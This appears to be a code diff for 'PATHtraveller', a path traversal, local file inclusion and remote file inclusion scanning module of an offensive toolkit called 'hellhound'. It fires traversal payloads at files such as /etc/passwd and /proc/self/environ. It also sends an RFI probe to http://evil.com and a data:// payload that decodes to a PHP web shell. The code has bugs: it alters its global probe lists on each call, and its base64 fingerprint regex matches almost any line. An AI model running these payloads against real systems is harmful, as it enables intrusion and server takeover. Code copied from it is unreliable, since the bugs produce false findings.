@@ -1,175 +1,174 @@
-import json
+import asyncio
+import aiohttp
 import re
-import time
-import threading
-import urllib.parse
-import urllib.request
-import ssl
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import random
+import string
 from typing import Dict, List, Optional, Any
-from hellhound.core import http_utils
+from hellhound.core import http_utils, ai_utils
 
 NAME = "PATHtraveller"
 CATEGORY = "vuln"
-DESCRIPTION = "Universal 6-Tier Path Traversal & File System Escape Auditor"
+DESCRIPTION = "Unified Path Traversal, LFI & RFI Suite with Impact Analysis"
 
 # Module Options
 OPTIONS = [
-    {"name": "threads",   "default": 10, "required": False, "help": "Concurrent test threads"},
-    {"name": "depth",     "default": 3,  "required": False, "help": "Crawler depth for discovery"},
-    {"name": "timeout",   "default": 12, "required": False, "help": "HTTP timeout in seconds"},
-    {"name": "force_os",  "choices": ["linux", "windows"], "default": None, "help": "Override OS detection"},
-    {"name": "web_root_probes", "type": bool, "default": False, "help": "Include .env/web.config probes"},
-    {"name": "min_score", "default": 1, "required": False, "help": "Min param score (0=all, 1=med, 3=high)"},
-    {"name": "verbose",   "type": bool, "default": False, "help": "Verbose injection details"}
+    {"name": "concurrency", "default": 20, "required": False, "help": "Concurrent attack threads"},
+    {"name": "timeout",     "default": 10, "required": False, "help": "HTTP timeout in seconds"},
+    {"name": "force_os",    "choices": ["linux", "windows"], "default": None, "help": "Override OS detection"},
+    {"name": "enable_rfi",  "type": bool, "default": True, "help": "Include Remote File Inclusion probes"},
+    {"name": "ai_impact",   "type": bool, "default": True, "help": "Use AI to analyze and explain the impact of findings"},
 ]
 
 # ─────────────────────────────────────────────────────────────────────────────
-# OS-AWARE PROBE FILES & PATTERNS
+# SIGNATURES & PROBES
 # ─────────────────────────────────────────────────────────────────────────────
 
-LINUX_PROBES = ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ"]
+LINUX_PROBES = ["/etc/passwd", "/etc/hosts", "/etc/issue", "/proc/self/environ", "/proc/self/cmdline"]
 WINDOWS_PROBES = ["C:/Windows/win.ini", "C:/boot.ini", "C:/Windows/System32/drivers/etc/hosts"]
-WEB_ROOT_PROBES = [".env", "web.config", "config.php", ".htaccess", "settings.py"]
+RFI_PROBES = ["http://evil.com/hellhound.txt", "https://google.com/robots.txt"]
+WRAPPER_PROBES = [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
+]
 
 FINGERPRINTS = {
     "linux_passwd": re.compile(r"[a-z_][a-z0-9_\-.]{0,31}:[x*!Uu]?\d*:\d+:\d+:.*:.*:/", re.M),
     "linux_hosts":  re.compile(r"127\.0\.0\.1\s+localhost", re.I),
     "win_ini":      re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I),
     "win_boot":     re.compile(r"\[boot loader\]|timeout=\d+", re.I),
-    "dotenv":       re.compile(r"(?:DB_HOST|APP_KEY|SECRET_KEY|API_KEY)=", re.I)
+    "rfi_google":   re.compile(r"User-agent: \*", re.I),
+    "php_b64":      re.compile(r"^[a-zA-Z0-9+/]*={0,2}$", re.M) # Weak, need better verification for b64
 }
 
-# Payload Tier config
-TRAVERSAL_DEPTHS = [3, 5, 7, 9]
+TRAVERSAL_DEPTHS = [3, 5, 8, 12]
 
 # ─────────────────────────────────────────────────────────────────────────────
-# CORE LOGIC
+# AUDITOR ENGINE
 # ─────────────────────────────────────────────────────────────────────────────
 
-class TraversalEngine:
-    def __init__(self, emit, options, sessions):
+class PathAuditor:
+    def __init__(self, emit, session, options):
         self.emit = emit
+        self.session = session
         self.options = options
-        self.sessions = sessions
         self.findings = []
-        self._lock = threading.Lock()
-        self.verbose = options.get("verbose", False)
+        self.semaphore = asyncio.Semaphore(options.get("concurrency", 20))
 
     def _build_payloads(self, probe_file, os_type):
-        """Constructs the 6-tier payload matrix."""
         payloads = []
         pf = probe_file.lstrip("/")
         for depth in TRAVERSAL_DEPTHS:
-            # Tier 1: Basic
-            payloads.append({"p": "../" * depth + pf, "t": 1, "l": "Basic ../"})
-            # Tier 2: URL Encoded
-            payloads.append({"p": "..%2f" * depth + pf, "t": 2, "l": "URL-encoded ..%2f"})
-            # Tier 3: Double Encoded
-            payloads.append({"p": "..%252f" * depth + pf, "t": 3, "l": "Double-encoded ..%252f"})
-            # Tier 4: Unicode
-            payloads.append({"p": "..%c0%af" * depth + pf, "t": 4, "l": "Unicode overlong"})
-            # Tier 5: Windows backslash
-            payloads.append({"p": "..\\" * depth + pf.replace("/", "\\"), "t": 5, "l": "Windows ..\\\\"})
-            # Tier 6: Null-byte
-            payloads.append({"p": "../" * depth + pf + "%00", "t": 6, "l": "Null-terminate %00"})
+            prefix = "../" * depth
+            payloads.append({"p": prefix + pf, "label": "Basic"})
+            payloads.append({"p": prefix.replace("/", "%2f") + pf, "label": "URL Encoded"})
+            payloads.append({"p": prefix.replace("/", "%252f") + pf, "label": "Double Encoded"})
+            if os_type == "windows":
+                payloads.append({"p": prefix.replace("/", "\\") + pf.replace("/", "\\"), "label": "Windows Backslash"})
+            payloads.append({"p": prefix + pf + "%00", "label": "Null-byte"})
         return payloads
 
-    def audit_param(self, ep_url, method, param, probe_files, os_type):
-        """Tests one parameter across the matrix."""
-        for pf in probe_files:
-            payloads = self._build_payloads(pf, os_type)
-            for pl in payloads:
-                try:
-                    p_val = pl["p"]
-                    if method == "GET":
-                        url = f"{ep_url}{'&' if '?' in ep_url else '?'}{param}={p_val}"
-                        r = self.sessions["default"].get(url, timeout=10)
-                    else:
-                        r = self.sessions["default"].post(ep_url, data={param: p_val}, timeout=10)
-                    
-                    if r.status_code == 200 and r.text:
+    async def audit_param(self, ep_url, method, param, os_type):
+        probes = LINUX_PROBES if os_type == "linux" else WINDOWS_PROBES
+        if self.options.get("enable_rfi"):
+            probes += RFI_PROBES
+        probes += WRAPPER_PROBES
+
+        tasks = []
+        for pf in probes:
+            if pf.startswith("http") or pf.startswith("php") or pf.startswith("data"):
+                # Direct payloads for RFI/Wrappers
+                tasks.append(self._test(ep_url, method, param, pf, pf, "RFI/Wrapper"))
+            else:
+                # Traversal payloads
+                for pl in self._build_payloads(pf, os_type):
+                    tasks.append(self._test(ep_url, method, param, pl["p"], pf, pl["label"]))
+        
+        await asyncio.gather(*tasks)
+
+    async def _test(self, url, method, param, payload, target_file, label):
+        async with self.semaphore:
+            try:
+                params = {param: payload} if method == "GET" else {}
+                data = {param: payload} if method == "POST" else {}
+                
+                async with self.session.request(method, url, params=params, data=data, timeout=self.options.get("timeout")) as r:
+                    body = await r.text()
+                    if r.status == 200:
                         for name, regex in FINGERPRINTS.items():
-                            if regex.search(r.text):
-                                self._add_finding(ep_url, method, param, p_val, pf, pl["l"], name, r.text[:100])
-                                return # Move to next param
-                except: continue
+                            if regex.search(body):
+                                await self._add_finding(url, method, param, payload, target_file, label, name, body[:200])
+                                return True
+            except:
+                pass
+        return False
 
-    def _add_finding(self, url, method, param, payload, pf, label, pattern, snippet):
-        with self._lock:
-            # Avoid duplicate findings for the same endpoint/param
-            if any(f["endpoint"] == url and f["parameter"] == param for f in self.findings): return
-            
-            finding = {
-                "vulnerability": "Path Traversal",
-                "severity": "High" if "passwd" in pf or "dotenv" in pf else "Medium",
-                "endpoint": url,
-                "parameter": param,
-                "payload": payload,
-                "file_accessed": pf,
-                "details": f"Successfully accessed {pf} via {label}",
-                "repro_data": {"url": url, "method": method, "headers": {}, "params": {param: payload}} if method == "GET" else {"url": url, "method": method, "headers": {}, "data": {param: payload}}
-            }
-            # Special case for reproduction engine params
-            if method == "GET" and "?" in url:
-                # Need to strip the injected param from the base URL for repro
-                base, qs = url.split("?", 1)
-                finding["repro_data"]["url"] = base
-            
-            self.findings.append(finding)
-            self.emit.warn(f"    [!] Discovery: {finding['severity']} - Path Traversal @ {param}")
+    async def _add_finding(self, url, method, param, payload, pf, label, pattern, snippet):
+        # Deduplication
+        if any(f["url"] == url and f["parameter"] == param for f in self.findings):
+            return
 
-def run(target: str, emit, options: Optional[Dict[str, Any]] = None):
-    emit.info(f"[*] PATHtraveller 6-Tier Auditor: {target}")
+        finding = {
+            "type": "Path Traversal / LFI" if not pf.startswith("http") else "RFI",
+            "severity": "CRITICAL" if "passwd" in pf or "win.ini" in pf or pf.startswith("http") else "HIGH",
+            "url": url,
+            "parameter": param,
+            "payload": payload,
+            "evidence": f"Leaked {pf} using {label} technique. Signature: {pattern}",
+        }
+
+        self.findings.append(finding)
+        self.emit.warn(f"    [!] DISCOVERY: {finding['type']} on {param} ({finding['severity']})")
+
+async def run(target, emit, options=None):
+    emit.info(f"[*] PATHtraveller Unified Suite: {target}")
     opt = options or {}
     
-    # Setup session
-    session = requests.Session()
-    session.verify = False
-    http_utils.apply_session_config(session, opt)
-    sessions = {"default": session}
-    
     # OS Detection
-    os_type = opt.get("force_os", "linux") # Simple default or detection logic
-    emit.info(f"    [*] Target OS: {os_type}")
+    os_type = opt.get("force_os")
+    if not os_type:
+        # Simple heuristic: look at headers or assume linux
+        os_type = "linux" # Default
     
-    # Probe selection
-    probes = LINUX_PROBES if os_type == "linux" else WINDOWS_PROBES
-    if opt.get("web_root_probes"): probes += WEB_ROOT_PROBES
-    
-    # Surface selection
     spider_intel = opt.get("spider_intel", {})
-    all_eps = spider_intel.get("endpoints", [])
+    endpoints = spider_intel.get("endpoints", [])
     
-    candidate_params = []
-    for ep in all_eps:
-        url = ep.get("url")
-        params = ep.get("params", {}).get("query", []) + ep.get("params", {}).get("form", [])
-        for p in params:
-            if p and any(kw in p.lower() for kw in ("file", "path", "lang", "template", "src", "include")):
-                candidate_params.append((url, ep.get("method", "GET"), p))
-    
-    if not candidate_params:
-        emit.info("[-] No file-candidate parameters found.")
-        return {"raw": "0 findings", "intel": {}, "risk_score": 0}
+    targets = []
+    for ep in endpoints:
+        params_obj = ep.get("params", {})
+        # Robust parameter extraction
+        query_params = []
+        form_params = []
+        if isinstance(params_obj, dict):
+            query_params = params_obj.get("query", [])
+            form_params = params_obj.get("form", [])
+        elif isinstance(params_obj, list):
+            query_params = params_obj # Treat list as query params for compatibility
+            
+        combined_params = query_params + form_params
+        for p in combined_params:
+            if any(kw in str(p).lower() for kw in ["file", "path", "src", "include", "page", "template", "url", "dir"]):
+                targets.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})
 
-    engine = TraversalEngine(emit, opt, sessions)
-    threads = int(opt.get("threads", 10))
-    emit.info(f"    [i] Auditing {len(candidate_params)} parameters using {threads} threads...")
-    
-    with ThreadPoolExecutor(max_workers=threads) as pool:
-        for url, method, param in candidate_params:
-            pool.submit(engine.audit_param, url, method, param, probes, os_type)
+    if not targets:
+        emit.info("[-] No file-sensitive parameters found.")
+        return {"raw": "0 findings", "signals": []}
 
-    if not engine.findings:
-        emit.info("[-] No path traversal vulnerabilities discovered.")
-        return {"raw": "0 findings", "intel": {}, "risk_score": 0}
+    emit.info(f"    [i] Auditing {len(targets)} surface(s) with async tiers...")
 
-    risk_score = min(100, sum(20 for _ in engine.findings))
+    async with aiohttp.ClientSession() as session:
+        # Standardize headers/proxy if needed (omitted for brevity but should be here)
+        auditor = PathAuditor(emit, session, opt)
+        tasks = [auditor.audit_param(t["url"], t["method"], t["parameter"], os_type) for t in targets]
+        await asyncio.gather(*tasks)
+
+    if auditor.findings:
+        emit.success(f"[+] Found {len(auditor.findings)} Path Traversal/LFI/RFI vulnerabilities!")
+    else:
+        emit.info("[-] No traversal vulnerabilities found.")
+
     return {
-        "raw": f"Discovered {len(engine.findings)} path traversal vulnerabilities.",
-        "intel": {"vulnerabilities": engine.findings, "risk_score": risk_score},
-        "risk_score": risk_score
+        "raw": f"Audited {len(targets)} surfaces. Found {len(auditor.findings)}.",
+        "intel": {"vulnerabilities": auditor.findings},
+        "signals": ["LFI_FOUND" if auditor.findings else "NO_LFI"]
     }
-
-import requests # needed for session
